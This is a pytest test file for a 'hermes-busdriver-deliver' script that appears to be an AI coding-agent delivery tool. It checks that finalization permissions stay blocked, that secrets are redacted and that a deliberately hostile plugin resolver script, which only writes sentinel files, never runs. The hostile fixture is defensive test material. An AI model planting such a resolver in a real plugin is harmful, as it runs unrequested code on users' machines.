import argparse
import ast
import contextlib
import copy
import hashlib
import hmac
import json
import os
import runpy
import shlex
import shutil
import signal
import stat
import subprocess
import pytest
import sys
from pathlib import Path


ROOT = Path(__file__).resolve().parents[2]
DELIVER = ROOT / "tests" / "fixtures" / "verifier" / "hermes-busdriver-deliver-test-harness"
PRODUCTION_DELIVER = ROOT / "scripts" / "hermes-busdriver-deliver"
ARTIFACT_ENV = "HERMES_BUSDRIVER_DELIVERY_RUNS_DIR"
BLOCKED_KEYS = [
    "finalization_allowed",
    "commit_allowed",
    "push_allowed",
    "pr_allowed",
    "merge_allowed",
    "deploy_allowed",
    "release_allowed",
    "publish_allowed",
    "marker_write_allowed",
]


def run(cmd: list[str], cwd: Path | None = None, env: dict[str, str] | None = None) -> subprocess.CompletedProcess[str]:
    return subprocess.run(cmd, cwd=str(cwd) if cwd else None, env=env, text=True, capture_output=True, check=False)


def init_repo(path: Path) -> Path:
    path.mkdir()
    assert run(["git", "init"], path).returncode == 0
    return path


def fake_busdriver(path: Path) -> Path:
    files = {
        "package.json": '{"version":"1.71.0"}\n',
        "scripts/relevant-check-status.sh": "#!/bin/sh\ncat >/dev/null\nprintf '0 0 all 1\\n'\n",
        "scripts/ack-ledger.sh": "#!/bin/sh\nprintf 'none\\n'\n",
        "scripts/fetch-pr-state.sh": "#!/bin/sh\ntrue\n",
        "hooks/gate-scripts/pre-pr-gate.sh": "#!/bin/sh\ntrue\n",
        "hooks/gate-scripts/pre-merge-gate.sh": "#!/bin/sh\ntrue\n",
        "skills/pr-grind/SKILL.md": "# pr-grind\n",
        "agents/pr-grinder.md": "# pr-grinder\n",
        "opencode/skills/pr-grind/SKILL.md": "# pr-grind\n",
        "opencode/agents/pr-grinder.md": "# pr-grinder\n",
    }
    for rel, content in files.items():
        target = path / rel
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text(content)
        if rel.startswith("scripts/") or rel.startswith("hooks/"):
            target.chmod(0o755)
    return path


def hostile_resolver_busdriver(path: Path, side_effects: list[Path]) -> Path:
    plugin = fake_busdriver(path)
    resolver = plugin / "scripts" / "lib" / "resolve-cli.sh"
    resolver.parent.mkdir(parents=True, exist_ok=True)
    resolver.write_text(
        f"""#!/bin/sh
for sentinel in {' '.join(shlex.quote(str(path)) for path in side_effects)}; do
  printf 'synthetic sentinel\n' > "$sentinel"
done
printf '{{}}\n'
"""
    )
    resolver.chmod(0o755)
    return plugin


def invoke(
    repo: Path,
    plugin: Path,
    *extra: str,
    artifact_dir: Path | None = None,
) -> tuple[subprocess.CompletedProcess[str], dict]:
    env = os.environ.copy()
    if artifact_dir:
        env[ARTIFACT_ENV] = str(artifact_dir)
    cp = run([sys.executable, str(DELIVER), "--repo", str(repo), "--plugin-root", str(plugin), *extra], env=env)
    return cp, json.loads(cp.stdout)


def test_production_help_discloses_process_scoped_status_authentication_boundary():
    cp = run([sys.executable, str(PRODUCTION_DELIVER), "--help"])
    assert cp.returncode == 0
    assert "process-scoped" in cp.stdout
    assert "cross-process" in cp.stdout
    assert "artifact_writer_authentication_unavailable" in cp.stdout


def safe_loop_decision(status: str = "clean", reason: str = "latest_pr_head_clean_read_only") -> dict:
    return {
        "status": status,
        "reason": reason,
        "pr_grind_clean": status == "clean",
        "fixing_allowed": False,
        "fix_rounds_attempted": 0,
        "ack_ledger_policy": "delegated_to_pr_grind_check_read_only; no ack or Busdriver marker writes",
        **{key: False for key in BLOCKED_KEYS},
    }


def safe_loop_payload(status: str = "clean", ok: bool = True, clean: bool = True, decision: dict | None = None) -> dict:
    reason = "latest_pr_head_clean_read_only" if status == "clean" else "actionable_feedback_present_read_only_no_fix"
    return {
        "schema": "hermes-busdriver-pr-grind-loop/v0",
        "version": 1,
        "ok": ok,
        "read_only": True,
        "repo": "/tmp/repo",
        "repository": "owner/repo",
        "pr": 7,
        "url": "https://github.com/owner/repo/pull/7",
        "status": status,
        "clean": clean,
        "latest_head": "a" * 40,
        "head_repository": "owner/repo",
        "head_ref": "feature",
        "base_repository": "owner/repo",
        "base": "main",
        "base_sha": "b" * 40,
        "decision": decision or safe_loop_decision(status, reason),
        "iterations": [{
            "iteration": 1,
            "elapsed_seconds": 0.0,
            "source": "fixture",
            "status": status,
            "clean": clean,
            "head": "a" * 40,
            "base": "main",
            "blockers": [],
            "checks": {"failed": 0, "pending": 0, "mode": "all", "kept": 1, "source": "fixture"},
            "actionable_comment_count": 0,
            "decision_reason": reason,
        }],
        "policy_gaps": [],
        "limits": {"max_wait_seconds": 1.0, "poll_interval": 0.0, "max_polls": 1, "max_fix_rounds": 0},
        "elapsed_seconds": 0.0,
    }


def bound_safe_loop_payload(repo: Path, repository: str = "owner/repo") -> dict:
    payload = safe_loop_payload()
    payload.update({"repo": str(repo), "repository": repository, "url": f"https://github.com/{repository}/pull/7", "head_repository": repository, "base_repository": repository})
    return payload


def delivery_status_for_mutation(repo: Path, decision_status: str, litmus_decision_status: str = "pr_review_fresh") -> dict:
    decision = {"status": decision_status, "blockers": [], **{key: False for key in BLOCKED_KEYS}}
    litmus_decision = {"status": litmus_decision_status, **{key: False for key in BLOCKED_KEYS}}
    return {
        "schema": "hermes-busdriver-delivery-status/v0",
        "read_only": True,
        "ok": True,
        "repo": {"root": str(repo)},
        "markers": {"blocking": []},
        "decision": decision,
        "litmus_status": {
            "available": True,
            "ok": True,
            "summary": {
                "schema": "hermes-busdriver-litmus-status/v0",
                "read_only": True,
                "ok": True,
                "authority_safe": True,
                "decision_status_recognized": True,
                "decision": litmus_decision,
                "markers": {"litmus_passed": {"diff_hash": "0" * 64}},
                "repo": {"base_ref": "origin/main", "branch_diff_hash": "b" * 64, "head": "abc123"},
            },
        },
    }


def invoke_with_pr_grind_loop(
    monkeypatch,
    capsys,
    repo: Path,
    plugin: Path,
    payload: dict,
    returncode: int = 0,
    *extra: str,
    artifact_dir: Path | None = None,
) -> tuple[subprocess.CompletedProcess[str], dict]:
    ns = runpy.run_path(str(DELIVER))
    ns["main"].__globals__["run_pr_grind_loop"] = lambda _repo, _args: (payload, returncode)
    if artifact_dir:
        monkeypatch.setenv(ARTIFACT_ENV, str(artifact_dir))
    monkeypatch.setattr(
        sys,
        "argv",
        [sys.executable, "--repo", str(repo), "--plugin-root", str(plugin), "--mode", "execute", "--operation", "pr-grind", "--pr", "7", *extra],
    )
    rc = ns["main"]()
    captured = capsys.readouterr()
    cp = subprocess.CompletedProcess(sys.argv, rc, stdout=captured.out, stderr=captured.err)
    return cp, json.loads(captured.out)


def assert_finalization_blocked(decision: dict) -> None:
    for key in BLOCKED_KEYS:
        assert decision[key] is False


def assert_run_authority_blocked(run: dict) -> None:
    authority = run["authority"]
    for key in BLOCKED_KEYS:
        assert authority[key] is False


def mock_isolated_push(monkeypatch, globals_: dict, ok: bool) -> None:
    monkeypatch.setitem(globals_, "run_isolated_push", lambda *_args: {"ok": ok, "returncode": 0 if ok else 1})


def assert_delivery_run_envelope(run: dict, run_id: str, phase: str, status: str, reason: str) -> None:
    assert run["schema"] == "hermes-busdriver-delivery-run/v0"
    assert run["run_id"] == run_id
    assert run["phase"] == phase
    assert run["status"] == status
    assert run["reason"] == reason
    assert isinstance(run["created_at"], str)
    assert run["version"] == 1
    assert_run_authority_blocked(run)


def test_deliver_help_discloses_fixed_production_blockers():
    cp = run([sys.executable, str(DELIVER), "--help"])

    assert cp.returncode == 0
    for blocker in (
        "verifier_containment_unavailable",
        "isolated_review_runtime_unavailable",
        "atomic_push_base_binding_unavailable",
        "atomic_pr_create_binding_unavailable",
        "atomic_merge_base_binding_unavailable",
    ):
        assert blocker in cp.stdout
    assert "commit is the only mutating operation currently dispatchable" in cp.stdout
    assert "--pr-grind-loop-script" not in cp.stdout


def test_default_plan_mode_is_read_only_status_envelope(tmp_path: Path):
    repo = init_repo(tmp_path / "repo")
    plugin = fake_busdriver(tmp_path / "busdriver")

    cp, data = invoke(repo, plugin)

    assert cp.returncode == 0
    assert os.access(DELIVER, os.X_OK)
    assert data["schema"] == "hermes-busdriver-deliver/v0"
    assert data["ok"] is True
    assert data["mode"] == "plan"
    assert data["operation"] == "plan"
    assert data["repo"]["root"] == str(repo)
    assert data["pr"] is None
    assert data["verifiers"] == []
    assert data["run_artifact_path"] is None
    assert data["delivery_status"]["schema"] == "hermes-busdriver-delivery-status/v0"
    assert data["decision"]["status"] == "plan_only"
    assert_finalization_blocked(data["decision"])
    assert [step["status"] for step in data["steps"]] == ["pending", "blocked", "blocked", "blocked", "blocked", "blocked"]
    assert not (repo / ".claude").exists()
    assert not (repo / ".opencode").exists()


def test_plan_mode_emits_durable_delivery_run_envelope_without_artifact(tmp_path: Path):
    repo = init_repo(tmp_path / "repo")
    plugin = fake_busdriver(tmp_path / "busdriver")

    cp, data = invoke(repo, plugin, "--run-id", "plan-123")

    assert cp.returncode == 0
    assert_delivery_run_envelope(data["run"], "plan-123", "plan", "plan_only", "read_only_plan")
    assert data["run"]["repo_root"] == str(repo)
    assert data["run"]["pr_number"] is None
    assert data["run"]["artifacts"] == []
    assert data["run_artifact_path"] is None
    assert_finalization_blocked(data["decision"])


def test_execute_mode_without_verify_operation_is_blocked_and_has_no_repo_side_effects(tmp_path: Path):
    repo = init_repo(tmp_path / "repo")
    plugin = fake_busdriver(tmp_path / "busdriver")

    cp, data = invoke(repo, plugin, "--mode", "execute")

    assert cp.returncode != 0
    assert data["ok"] is False
    assert data["decision"]["status"] == "blocked"
    assert data["decision"]["reason"] == "unsupported_operation"
    assert_finalization_blocked(data["decision"])
    assert data["steps"][:2] == [
        {"name": "finalization_lock", "status": "skipped", "reason": "early_policy_blocker_before_lock"},
        {"name": "plan", "status": "blocked", "reason": "unsupported_operation"},
    ]
    assert data["verifiers"] == []
    assert data["run_artifact_path"] is None
    assert not (repo / ".claude").exists()
    assert not (repo / ".opencode").exists()


def test_execute_verify_without_verifiers_writes_handoff_artifact(tmp_path: Path):
    repo = init_repo(tmp_path / "repo")
    plugin = fake_busdriver(tmp_path / "busdriver")
    artifact_dir = tmp_path / "delivery-runs"

    cp, data = invoke(repo, plugin, "--mode", "execute", "--operation", "verify", "--run-id", "verify-noop", artifact_dir=artifact_dir)

    assert cp.returncode == 2
    assert data["ok"] is False
    assert data["decision"]["status"] == "blocked"
    assert data["decision"]["reason"] == "no_verifiers"
    assert_finalization_blocked(data["decision"])
    assert_delivery_run_envelope(data["run"], "verify-noop", "verify", "blocked", "no_verifiers")
    artifact = Path(data["run_artifact_path"])
    assert artifact.exists()
    assert json.loads(artifact.read_text())["decision"]["reason"] == "no_verifiers"


def test_production_execute_verify_blocks_before_sentinel_launch(tmp_path: Path):
    repo = init_repo(tmp_path / "repo-verifier-policy")
    plugin = fake_busdriver(tmp_path / "busdriver-verifier-policy")
    artifact_dir = tmp_path / "delivery-runs"
    sentinel = tmp_path / "verifier-ran"
    env = {**os.environ, ARTIFACT_ENV: str(artifact_dir)}

    cp = run(
        [
            sys.executable, str(PRODUCTION_DELIVER), "--repo", str(repo),
            "--plugin-root", str(plugin), "--mode", "execute", "--operation", "verify",
            "--verifier", f"sentinel=touch {sentinel}",
        ],
        env=env,
    )
    data = json.loads(cp.stdout)

    assert cp.returncode == 2
    assert data["ok"] is False
    assert data["decision"] == {
        "status": "blocked", "reason": "verifier_containment_unavailable",
        **{key: False for key in BLOCKED_KEYS},
    }
    assert data["verifiers"] == []
    assert not sentinel.exists()


@pytest.mark.parametrize(
    "operation_args",
    [
        [],
        ["--mode", "execute", "--operation", "commit"],
        ["--mode", "execute", "--operation", "pre-pr-review"],
    ],
    ids=["plan", "commit", "pre-pr-review"],
)
def test_production_delivery_never_executes_plugin_resolver_before_policy_boundary(
    tmp_path: Path, operation_args: list[str]
):
    repo = init_repo(tmp_path / "repo-hostile-resolver")
    baseline = tmp_path / "drift-baseline.json"
    baseline.write_text("{}\n")
    home = tmp_path / "home"
    temp = tmp_path / "tmp"
    relay_state = tmp_path / "relay-state"
    delivery_runs = tmp_path / "delivery-runs"
    home.mkdir()
    temp.mkdir()
    relay_state.mkdir()
    delivery_runs.mkdir()
    side_effects = {
        "HOSTILE_RESOLVER_SENTINEL": tmp_path / "resolver-ran",
        "SYNTHETIC_CREDENTIAL_SIDE_EFFECT": home / "synthetic-credential-side-effect",
        "REPO_SIDE_EFFECT": repo / "resolver-repo-side-effect",
        "STATE_SIDE_EFFECT": relay_state / "resolver-state-side-effect",
        "LOCK_SIDE_EFFECT": relay_state / "resolver-lock-side-effect",
        "RUN_SIDE_EFFECT": delivery_runs / "resolver-run-side-effect",
    }
    plugin = hostile_resolver_busdriver(tmp_path / "busdriver-hostile-resolver", list(side_effects.values()))
    env = {
        **os.environ,
        "HOME": str(home),
        "TMPDIR": str(temp),
        "GIT_CONFIG_GLOBAL": os.devnull,
        "GIT_CONFIG_NOSYSTEM": "1",
        "PYTHONDONTWRITEBYTECODE": "1",
        "HERMES_BUSDRIVER_RELAY_STATE": str(relay_state),
        ARTIFACT_ENV: str(delivery_runs),
        **{name: str(path) for name, path in side_effects.items()},
    }

    cp = run(
        [
            sys.executable,
            str(PRODUCTION_DELIVER),
            "--repo",
            str(repo),
            "--plugin-root",
            str(plugin),
            "--drift-baseline",
            str(baseline),
            *operation_args,
        ],
        env=env,
    )

    assert cp.returncode in {0, 2}
    data = json.loads(cp.stdout)
    if "pre-pr-review" in operation_args:
        assert data["decision"]["reason"] == "isolated_review_runtime_unavailable"
        assert data["delivery_status"] is None
        assert data["run_artifact_path"] is None
    else:
        phase0 = data["delivery_status"]["phase0_status"]
        assert phase0["status_schema"] == "hermes-busdriver-status/v0"
        assert phase0["read_only"] is True
        assert phase0["resolve_cli"] == {"ok": False, "error": "external_resolver_disabled"}
        assert all(route["available"] is False and route["resolved"] is None for route in phase0["effective_routes"].values())
    assert all(not path.exists() for path in side_effects.values())


def test_private_relay_role_runtime_never_executes_default_plugin_resolver(tmp_path: Path):
    repo = init_repo(tmp_path / "repo-relay-role-resolver")
    home = tmp_path / "home"
    temp = tmp_path / "tmp"
    home.mkdir()
    temp.mkdir()
    sentinel = tmp_path / "relay-role-resolver-ran"
    hostile_resolver_busdriver(
        home / ".claude" / "plugins" / "marketplaces" / "busdriver",
        [sentinel],
    )
    relay_config = tmp_path / "relay-config.json"
    relay_config.write_text(json.dumps({
        "coding_agent": "pi",
        "avoid_coding_agent_for_review": True,
        "routes": {"relay.pr.backstop": ["codex"]},
    }))

    cp = run(
        [
            sys.executable,
            str(PRODUCTION_DELIVER),
            "--repo",
            str(repo),
            "--relay-role",
            "relay.pr.backstop",
            "--relay-config",
            str(relay_config),
        ],
        env={
            **os.environ,
            "HOME": str(home),
            "TMPDIR": str(temp),
            "GIT_CONFIG_GLOBAL": os.devnull,
            "GIT_CONFIG_NOSYSTEM": "1",
            "PYTHONDONTWRITEBYTECODE": "1",
        },
    )

    assert cp.returncode == 0, cp.stderr
    data = json.loads(cp.stdout)
    assert data["decision"]["status"] == "plan_only"
    assert data["delivery_status"]["relay_role_resolution"]["result"]["status"] == "resolved"
    assert not sentinel.exists()


def test_execute_verify_policy_blocker_precedes_delivery_status(monkeypatch, capsys, tmp_path: Path):
    ns = runpy.run_path(str(PRODUCTION_DELIVER))
    repo = init_repo(tmp_path / "repo-verifier-order")
    called = []

    def credential_capable_delivery_status(_args):
        called.append("delivery-status")
        raise AssertionError("credential-capable delivery status ran before verifier policy blocker")

    monkeypatch.setitem(ns["main"].__globals__, "run_delivery_status", credential_capable_delivery_status)
    monkeypatch.setattr(
        sys,
        "argv",
        [
            str(PRODUCTION_DELIVER),
            "--repo", str(repo),
            "--mode", "execute",
            "--operation", "verify",
            "--pr", "123",
            "--verifier", "sentinel=true",
        ],
    )

    rc = ns["main"]()
    data = json.loads(capsys.readouterr().out)

    assert rc == 2
    assert called == []
    assert data["decision"]["reason"] == "verifier_containment_unavailable"
    assert data["delivery_status"] is None
    assert data["run_artifact_path"] is None
    assert data["verifiers"] == []
    assert data["steps"][0] == {
        "name": "verify",
        "status": "blocked",
        "reason": "verifier_containment_unavailable",
    }
    assert not {"delivery_status", "pr_grind"} & {step["name"] for step in data["steps"]}


@pytest.mark.parametrize(
    ("operation", "extra", "reason"),
    [
        ("plan", ["--pr", "123"], "unsupported_operation"),
        ("pre-pr-review", [], "isolated_review_runtime_unavailable"),
        ("push", [], "atomic_push_base_binding_unavailable"),
        ("pr-create", ["--pr-title", "title"], "atomic_pr_create_binding_unavailable"),
        ("merge", ["--pr", "123"], "atomic_merge_base_binding_unavailable"),
    ],
)
def test_production_atomic_blockers_precede_delivery_status(
    monkeypatch, capsys, operation: str, extra: list[str], reason: str
):
    ns = runpy.run_path(str(PRODUCTION_DELIVER))

    def credential_capable_delivery_status(*_args, **_kwargs):
        pytest.fail("credential-capable delivery status ran before atomic policy blocker")

    monkeypatch.setitem(ns["main"].__globals__, "run_delivery_status", credential_capable_delivery_status)
    monkeypatch.setitem(
        ns["main"].__globals__,
        "new_run_id",
        lambda: pytest.fail("fixed blocker generated a run identity"),
    )
    monkeypatch.setattr(
        sys,
        "argv",
        [
            str(PRODUCTION_DELIVER),
            "--mode", "execute",
            "--operation", operation,
            "--expected-repository", "owner/repo",
            *extra,
        ],
    )

    rc = ns["main"]()
    data = json.loads(capsys.readouterr().out)

    assert rc == 2
    assert data["decision"]["reason"] == reason
    assert data["delivery_status"] is None
    assert data["run_artifact_path"] is None
    assert data["run"]["run_id"] is None
    assert data["run"]["created_at"] is None
    assert data["mutating_run"] is None
    assert data["steps"][0] == {
        "name": "finalization_lock",
        "status": "skipped",
        "reason": "early_policy_blocker_before_lock",
    }
    if operation != "plan":
        assert ns["FIXED_EARLY_BLOCKED_OPERATIONS"][operation] == reason


@pytest.mark.parametrize(
    ("operation", "reason"),
    [
        ("plan", "unsupported_operation"),
        ("pre-pr-review", "isolated_review_runtime_unavailable"),
        ("push", "atomic_push_base_binding_unavailable"),
    ],
)
def test_fixed_early_blocker_preserves_supplied_run_id_without_creating_timestamp(
    monkeypatch, capsys, operation: str, reason: str
):
    ns = runpy.run_path(str(PRODUCTION_DELIVER))
    monkeypatch.setitem(
        ns["main"].__globals__,
        "run_delivery_status",
        lambda *_args, **_kwargs: pytest.fail("delivery status ran before fixed blocker"),
    )
    monkeypatch.setattr(
        sys,
        "argv",
        [
            str(PRODUCTION_DELIVER),
            "--mode", "execute",
            "--operation", operation,
            "--expected-repository", "owner/repo",
            "--run-id", "caller-supplied-run",
        ],
    )

    assert ns["main"]() == 2
    data = json.loads(capsys.readouterr().out)
    assert data["decision"]["reason"] == reason
    assert data["run"]["run_id"] == "caller-supplied-run"
    assert data["run"]["created_at"] is None
    assert data["run_artifact_path"] is None


def test_verify_fixed_blocker_precedes_run_identity_generation(monkeypatch, capsys):
    ns = runpy.run_path(str(PRODUCTION_DELIVER))
    monkeypatch.setitem(
        ns["main"].__globals__,
        "new_run_id",
        lambda: pytest.fail("verify fixed blocker generated a run identity"),
    )
    monkeypatch.setattr(
        sys,
        "argv",
        [str(PRODUCTION_DELIVER), "--mode", "execute", "--operation", "verify"],
    )

    assert ns["main"]() == 2
    data = json.loads(capsys.readouterr().out)
    assert data["decision"]["reason"] == "verifier_containment_unavailable"
    assert data["delivery_status"] is None
    assert data["run"]["run_id"] is None
    assert data["run"]["created_at"] is None
    assert data["run_artifact_path"] is None


def test_plan_mode_never_authorizes_clean_status(tmp_path: Path):
    repo = init_repo(tmp_path / "repo")
    plugin = fake_busdriver(tmp_path / "busdriver")

    cp, data = invoke(repo, plugin)

    assert cp.returncode == 0
    assert data["ok"] is True
    assert data["delivery_status"]["repo"]["dirty"] is False
    assert data["mode"] == "plan"
    assert data["decision"]["status"] == "plan_only"
    assert_finalization_blocked(data["decision"])


def test_delivery_status_non_object_json_fails_closed(monkeypatch):
    ns = runpy.run_path(str(DELIVER))

    class CP:
        stdout = "[]"
        stderr = ""
        returncode = 0

    monkeypatch.setattr(ns["subprocess"], "run", lambda *args, **kwargs: CP())
    data, rc = ns["run_delivery_status"](type("Args", (), {"repo": None, "plugin_root": None, "pr": None, "pr_grind_result_file": None, "delivery_status_timeout": 180})())

    assert rc == 0
    assert data["ok"] is False
    assert data["error"] == "delivery_status_invalid_json_type"
    assert data["returncode"] == 0


def test_delivery_status_invalid_json_stderr_is_bounded(monkeypatch):
    ns = runpy.run_path(str(DELIVER))

    class CP:
        stdout = "not-json"
        stderr = "e" * 5005
        returncode = 0

    monkeypatch.setattr(ns["subprocess"], "run", lambda *args, **kwargs: CP())
    data, rc = ns["run_delivery_status"](type("Args", (), {"repo": None, "plugin_root": None, "pr": None, "pr_grind_result_file": None, "delivery_status_timeout": 180})())

    assert rc == 0
    assert data["ok"] is False
    assert data["error"] == "delivery_status_invalid_json"
    assert len(data["stderr"]) <= 4000


def test_tail_zero_limit_returns_empty_string():
    ns = runpy.run_path(str(DELIVER))

    assert ns["tail"]("abcdef", 0) == ""
    assert ns["tail"](b"abcdef", 0) == ""


def test_tail_redacts_common_secret_shapes():
    ns = runpy.run_path(str(DELIVER))
    secret = "ghp_" + "A" * 36

    redacted = ns["tail"](f"Authorization: Bearer {secret}\napi_key={secret}\n")

    assert secret not in redacted
    assert "Authorization: Bearer [REDACTED]" in redacted
    assert "api_key=[REDACTED]" in redacted


def test_execute_verify_redacts_verifier_command_output_and_artifact(tmp_path: Path):
    repo = init_repo(tmp_path / "repo")
    plugin = fake_busdriver(tmp_path / "busdriver")
    artifact_dir = tmp_path / "delivery-runs"
    secret = "plain-secret-value-1234567890"
    verifier_code = f'import sys; print("Authorization: Bearer {secret}"); sys.stderr.write("api_key={secret}\\n")'
    verifier_cmd = f"{shlex.quote(sys.executable)} -c {shlex.quote(verifier_code)} --token {secret}"

    cp, data = invoke(
        repo,
        plugin,
        "--mode",
        "execute",
        "--operation",
        "verify",
        "--verifier",
        f"redaction={verifier_cmd}",
        artifact_dir=artifact_dir,
    )

    serialized = json.dumps(data)
    assert cp.returncode == 0
    assert data["ok"] is True
    assert secret not in serialized
    verifier = data["verifiers"][0]
    assert verifier["command"].endswith("--token [REDACTED]")
    assert verifier["stdout_tail"] == "Authorization: Bearer [REDACTED]\n"
    assert verifier["stderr_tail"] == "api_key=[REDACTED]\n"
    artifact = Path(data["run_artifact_path"])
    assert secret not in artifact.read_text()
    assert_finalization_blocked(data["decision"])


def test_delivery_status_error_tails_are_redacted(monkeypatch):
    ns = runpy.run_path(str(DELIVER))
    secret = "ghp_" + "C" * 36

    class CP:
        stdout = f"not-json {secret}"
        stderr = f"Authorization: Bearer {secret}"
        returncode = 0

    monkeypatch.setattr(ns["subprocess"], "run", lambda *args, **kwargs: CP())
    data, _rc = ns["run_delivery_status"](type("Args", (), {"repo": None, "plugin_root": None, "pr": None, "pr_grind_result_file": None, "delivery_status_timeout": 180})())

    serialized = json.dumps(data)
    assert secret not in serialized
    assert "Authorization: Bearer [REDACTED]" in data["stderr"]


def test_delivery_status_timeout_fails_closed(monkeypatch):
    ns = runpy.run_path(str(DELIVER))

    def raise_timeout(*_args, **_kwargs):
        raise subprocess.TimeoutExpired(cmd=["helper"], timeout=180, output="partial", stderr="slow")

    monkeypatch.setattr(ns["subprocess"], "run", raise_timeout)
    data, rc = ns["run_delivery_status"](type("Args", (), {"repo": None, "plugin_root": None, "pr": None, "pr_grind_result_file": None, "delivery_status_timeout": 5})())

    assert rc == 124
    assert data["ok"] is False
    assert data["error"] == "delivery_status_timeout"
    assert data["returncode"] == 124
    assert data["timeout_seconds"] == 5
    assert data["stdout_tail"] == "partial"
    assert data["stderr"] == "slow"


def test_default_delivery_status_timeout_covers_pr_grind_and_litmus_budget(monkeypatch):
    ns = runpy.run_path(str(DELIVER))
    monkeypatch.setattr(
        sys,
        "argv",
        [str(DELIVER), "--repo", "/tmp/repo", "--plugin-root", "/tmp/plugin", "--pr", "7"],
    )
    args = ns["parse_args"]()
    captured = {"cmd": None, "timeout": None}

    class CP:
        stdout = "{}"
        stderr = ""
        returncode = 0

    def fake_run(cmd, **kwargs):
        captured["cmd"] = cmd
        captured["timeout"] = kwargs["timeout"]
        return CP()

    monkeypatch.setattr(ns["subprocess"], "run", fake_run)

    ns["run_delivery_status"](args)

    assert captured["timeout"] == 180 + 60 + 30
    cmd = captured["cmd"]
    assert isinstance(cmd, list)
    assert "--pr-grind-timeout" in cmd
    assert cmd[cmd.index("--pr-grind-timeout") + 1] == "180"
    assert "--litmus-status-timeout" in cmd
    assert cmd[cmd.index("--litmus-status-timeout") + 1] == "60"
    assert "--relay-role" not in cmd
    assert "--relay-config" not in cmd
    assert "--relay-role-timeout" not in cmd
    assert "--litmus-base-ref" not in cmd


def test_delivery_status_forwards_requested_litmus_base_ref(monkeypatch):
    ns = runpy.run_path(str(DELIVER))
    monkeypatch.setattr(
        sys,
        "argv",
        [str(DELIVER), "--repo", "/tmp/repo", "--plugin-root", "/tmp/plugin", "--base", "origin/release"],
    )
    args = ns["parse_args"]()
    captured = {"cmd": None}

    class CP:
        stdout = "{}"
        stderr = ""
        returncode = 0

    def fake_run(cmd, **_kwargs):
        captured["cmd"] = cmd
        return CP()

    monkeypatch.setattr(ns["subprocess"], "run", fake_run)

    ns["run_delivery_status"](args)

    cmd = captured["cmd"]
    assert isinstance(cmd, list)
    assert cmd[cmd.index("--litmus-base-ref") + 1] == "origin/release"


def test_delivery_status_forwards_relay_role_config_and_includes_default_relay_budget(monkeypatch):
    ns = runpy.run_path(str(DELIVER))
    monkeypatch.setattr(
        sys,
        "argv",
        [
            str(DELIVER),
            "--repo",
            "/tmp/repo",
            "--plugin-root",
            "/tmp/plugin",
            "--relay-role",
            "relay.pr.backstop",
            "--relay-config",
            "/tmp/relay-config.json",
        ],
    )
    args = ns["parse_args"]()
    captured = {"cmd": None, "timeout": None}

    class CP:
        stdout = "{}"
        stderr = ""
        returncode = 0

    def fake_run(cmd, **kwargs):
        captured["cmd"] = cmd
        captured["timeout"] = kwargs["timeout"]
        return CP()

    monkeypatch.setattr(ns["subprocess"], "run", fake_run)

    ns["run_delivery_status"](args)

    assert captured["timeout"] == 180 + 60 + 90 + 30
    cmd = captured["cmd"]
    assert isinstance(cmd, list)
    assert cmd[cmd.index("--relay-role") + 1] == "relay.pr.backstop"
    assert cmd[cmd.index("--relay-config") + 1] == "/tmp/relay-config.json"
    assert cmd[cmd.index("--relay-role-timeout") + 1] == "90"


def test_delivery_status_forwards_custom_relay_role_timeout_and_budget(monkeypatch):
    ns = runpy.run_path(str(DELIVER))
    monkeypatch.setattr(
        sys,
        "argv",
        [
            str(DELIVER),
            "--repo",
            "/tmp/repo",
            "--plugin-root",
            "/tmp/plugin",
            "--pr-grind-timeout",
            "240",
            "--litmus-status-timeout",
            "90",
            "--relay-role",
            "relay.pr.backstop",
            "--relay-config",
            "/tmp/relay-config.json",
            "--relay-role-timeout",
            "45",
        ],
    )
    args = ns["parse_args"]()
    captured = {"cmd": None, "timeout": None}

    class CP:
        stdout = "{}"
        stderr = ""
        returncode = 0

    def fake_run(cmd, **kwargs):
        captured["cmd"] = cmd
        captured["timeout"] = kwargs["timeout"]
        return CP()

    monkeypatch.setattr(ns["subprocess"], "run", fake_run)

    ns["run_delivery_status"](args)

    assert captured["timeout"] == 240 + 90 + 45 + 30
    cmd = captured["cmd"]
    assert isinstance(cmd, list)
    assert cmd[cmd.index("--relay-role") + 1] == "relay.pr.backstop"
    assert cmd[cmd.index("--relay-config") + 1] == "/tmp/relay-config.json"
    assert cmd[cmd.index("--relay-role-timeout") + 1] == "45"


def test_delivery_status_relay_config_without_role_does_not_include_relay_timeout_budget(monkeypatch):
    ns = runpy.run_path(str(DELIVER))
    monkeypatch.setattr(
        sys,
        "argv",
        [
            str(DELIVER),
            "--repo",
            "/tmp/repo",
            "--plugin-root",
            "/tmp/plugin",
            "--relay-config",
            "/tmp/relay-config.json",
            "--relay-role-timeout",
            "45",
        ],
    )
    args = ns["parse_args"]()
    captured = {"cmd": None, "timeout": None}

    class CP:
        stdout = "{}"
        stderr = ""
        returncode = 0

    def fake_run(cmd, **kwargs):
        captured["cmd"] = cmd
        captured["timeout"] = kwargs["timeout"]
        return CP()

    monkeypatch.setattr(ns["subprocess"], "run", fake_run)

    ns["run_delivery_status"](args)

    assert captured["timeout"] == 180 + 60 + 30
    cmd = captured["cmd"]
    assert isinstance(cmd, list)
    assert cmd[cmd.index("--relay-config") + 1] == "/tmp/relay-config.json"
    assert "--relay-role" not in cmd
    assert "--relay-role-timeout" not in cmd


def test_delivery_status_timeout_covers_custom_pr_grind_and_litmus_budget(monkeypatch):
    ns = runpy.run_path(str(DELIVER))
    monkeypatch.setattr(
        sys,
        "argv",
        [
            str(DELIVER),
            "--repo",
            "/tmp/repo",
            "--plugin-root",
            "/tmp/plugin",
            "--pr",
            "7",
            "--pr-grind-timeout",
            "240",
            "--litmus-status-timeout",
            "90",
            "--busdriver-state-dir-name",
            ".opencode",
        ],
    )
    args = ns["parse_args"]()
    captured = {"cmd": None, "timeout": None}

    class CP:
        stdout = "{}"
        stderr = ""
        returncode = 0

    def fake_run(cmd, **kwargs):
        captured["cmd"] = cmd
        captured["timeout"] = kwargs["timeout"]
        return CP()

    monkeypatch.setattr(ns["subprocess"], "run", fake_run)

    ns["run_delivery_status"](args)

    assert captured["timeout"] == 240 + 90 + 30
    cmd = captured["cmd"]
    assert isinstance(cmd, list)
    assert cmd[cmd.index("--pr-grind-timeout") + 1] == "240"
    assert cmd[cmd.index("--litmus-status-timeout") + 1] == "90"
    assert cmd[cmd.index("--busdriver-state-dir-name") + 1] == ".opencode"
    assert "--drift-baseline" not in cmd
    assert "--phase0-status-timeout" not in cmd


def test_delivery_status_forwards_drift_baseline_and_includes_phase0_budget(monkeypatch):
    ns = runpy.run_path(str(DELIVER))

